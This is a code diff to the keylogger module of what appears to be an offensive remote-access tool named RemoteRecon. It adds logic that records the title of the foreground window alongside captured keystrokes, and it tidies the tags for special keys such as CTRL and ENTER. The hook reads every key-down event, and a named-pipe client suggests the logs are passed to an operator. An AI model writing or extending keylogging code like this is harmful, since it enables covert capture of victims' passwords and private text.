@@ -20,7 +20,7 @@ namespace RemoteReconKS
         private static NamedPipeClientStream client;
         private static byte[] key;
         private static StreamWriter sw;
-        private static StringBuilder keylogoutput = new StringBuilder();
+        private static StringBuilder wndText = new StringBuilder();
 
         public static void Execute(string capability)
         {
@@ -122,6 +122,15 @@ namespace RemoteReconKS
             StringBuilder modKey = new StringBuilder();
             IntPtr kblh = WinApi.GetKeyboardLayout(Process.GetCurrentProcess().Id);
 
+            //Get the current foreground window
+            IntPtr hWindow = GetForegroundWindow();
+            string oldWndTxt = wndText.ToString();
+            int res = GetWindowText(hWindow, wndText, wndText.Capacity);
+
+            //Check to see if the window has changed
+            if (oldWndTxt.ToLower() != wndText.ToString().ToLower())
+                modKey.Append(" \r\n{" + wndText.ToString().Split('-')[0] + "}\r\n ");
+
             if (nCode >= 0 && (wParam == (IntPtr)WinApi.WM_KEYDOWN || wParam == (IntPtr)WinApi.WM_SYSKEYDOWN))
             {
                 int vkCode = Marshal.ReadInt32(lParam);
@@ -136,7 +145,7 @@ namespace RemoteReconKS
                         modKey.Append(" [RCTRL] ");
                         break;
                     case Keys.LControlKey:
-                        modKey.Append(" [LCTRL]");
+                        modKey.Append(" [LCTRL] ");
                         break;
                     case Keys.LWin:
                         modKey.Append(" [WIN] ");
@@ -148,7 +157,7 @@ namespace RemoteReconKS
                         modKey.Append(" [BKSP] ");
                         break;
                     case Keys.Enter:
-                        modKey.Append("[ENT]");
+                        modKey.Append(" [ENT] ");
                         break;
                     default:
                         break;
@@ -185,7 +194,7 @@ namespace RemoteReconKS
                         catch (Exception e)
                         {
 #if DEBUG
-                            File.AppendAllText(logPath, e.ToString());
+                            File.AppendAllText(logpath, e.ToString());
 #endif
                             Application.ExitThread();
                         }
